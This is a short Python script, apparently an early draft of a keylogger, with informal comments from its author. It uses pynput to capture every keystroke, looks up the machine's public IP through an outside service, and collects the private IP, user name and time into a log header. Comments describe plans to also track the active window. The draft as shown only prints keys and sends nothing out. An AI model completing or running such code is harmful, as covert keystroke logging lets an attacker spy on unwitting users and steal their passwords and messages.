"""
ok Mac haters
cant get current used window on mac ->
i have to code it on a windows computer xD
"""

from pynput.keyboard import Key, Listener
import time
import os
import random
import requests
import socket

publicIP = requests.get('https://api.ipify.org').text
privateIP = socket.gethostbyname(socket.gethostname())
user = os.path.expanduser('~').split('/')[2] # home directory splitting by '/' because i use unix system - for windows its "\\"
datetime = time.ctime(time.time())

msg = f'[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {publicIP}\n  *~ Private-IP: {privateIP}\n\n'
print(msg)
logged_data = []
logged_data.append(msg)

old_app = ''
delete_file = []

def on_press(key):
    global old_app
    """there i need something to listen current used window (in windows it is win32gui module)"""
    print(key)

"""temporary function to stop listening when esc is pressed"""
def on_release(key):
    if key == Key.esc:
        return False

"""keyboard listener"""
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
